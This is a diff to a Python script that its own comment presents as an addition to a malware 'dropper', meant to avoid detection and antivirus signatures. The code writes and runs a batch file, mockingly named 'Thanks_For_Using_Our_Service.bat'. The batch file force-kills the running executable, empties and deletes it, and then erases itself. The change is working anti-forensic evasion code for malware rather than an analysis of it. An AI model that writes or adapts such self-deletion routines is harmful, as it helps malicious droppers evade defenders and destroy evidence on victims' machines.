@@ -2,16 +2,18 @@
 #This script aims to add the ability of the self-remove and kill to the dropper to avoid detection and possible av signtures
 #Start
 
+from sys import executable
 def selfdestruct():
-    from sys import executable
-    filename = executable.split("\\")[-1]
-    data = '''@echo off
-    TASKKILL /F /IM "{}"
-    DEL -f "{}"
-    DEL "%~f0"'''.format( filename,filename )
-    f = open("nothing.bat","w")
-    f.write(data)
-    f.close()
-    xxx = subprocess.Popen("nothing.bat > NUL",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+	filename = executable.split("\\")[-1]
+	data = '''@echo off
+TASKKILL /F /IM "{0}"
+break>{0}
+DEL -f "{0}"
+break>"%~f0" && DEL "%~f0"
+echo Good but not good enough >> {0}'''.format( filename )
+	f = open("Thanks_For_Using_Our_Service.bat","w") #Looool :XD
+	f.write(data)
+	f.close()
+	xxx = subprocess.Popen("Thanks_For_Using_Our_Service.bat >> NUL",shell=True)
 
 selfdestruct()
